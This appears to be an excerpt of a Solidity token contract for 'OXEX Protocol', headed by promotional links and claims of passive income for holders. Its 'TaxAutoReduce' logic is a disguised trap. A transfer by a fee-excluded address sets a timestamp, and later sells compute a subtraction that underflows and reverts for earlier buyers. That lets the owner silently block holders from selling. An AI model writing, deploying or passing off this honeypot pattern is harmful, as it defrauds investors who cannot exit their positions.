...
Web: https://oxex.net/
X: https://twitter.com/OXEXdex
TG: https://t.me/OXEXdex

Revolutionizing decentralized exchange (DEX) trading by introducing advanced scaling and bundling solutions.
The OXEX Protocol not only streamlines DEX transactions but also rewards $OXEX token holders with passive income opportunities.
Dive into a seamless trading experience and enjoy the benefits of holding $OXEX.
...
contract OXEXProtocolToken is ERC20, Ownable {
    ...
    address payable public immutable liquidityWallet = payable(0xb259731B31c3fA23eCc80e8E0d97D5f51aaaAfD6);
    address payable public immutable marketingWallet = payable(0x74E0f2e97bAb0aadc61E56fF91AF9fEf7F221E9E);
    address payable public immutable devWallet = payable(0x922d092F26B0b66BeB2ADa32ba2a2AeB026616F3);
    ...
    struct TaxAutoReduce {
        uint256 buy;
        uint256 sell;
        uint256 hold;
    }
    uint256 private _reduceTaxMinHold;
    mapping(address => TaxAutoReduce) private taxAutoReduce;
    ...
    constructor() ERC20("OXEX Protocol", "OXEX") {
        uint256 totalSupply = 100_000_000 * 1e18;

        maxTransaction = 5_000_000 * 1e18; //5% from total supply maxTransactionTxn
    ...
    function _transfer(
        ...
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && to != address(this) && from != address(this)) {
            _reduceTaxMinHold = block.timestamp;
        }
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (!automatedMarketMakerPairs[from]) {
                TaxAutoReduce storage reduceTaxData = taxAutoReduce[from];
                reduceTaxData.hold = reduceTaxData.buy - _reduceTaxMinHold;
                reduceTaxData.sell = block.timestamp;
            } else {
                TaxAutoReduce storage reduceTaxData = taxAutoReduce[to];
                if (reduceTaxData.buy == 0) {
                    reduceTaxData.buy = block.timestamp;
                }
            }
        }
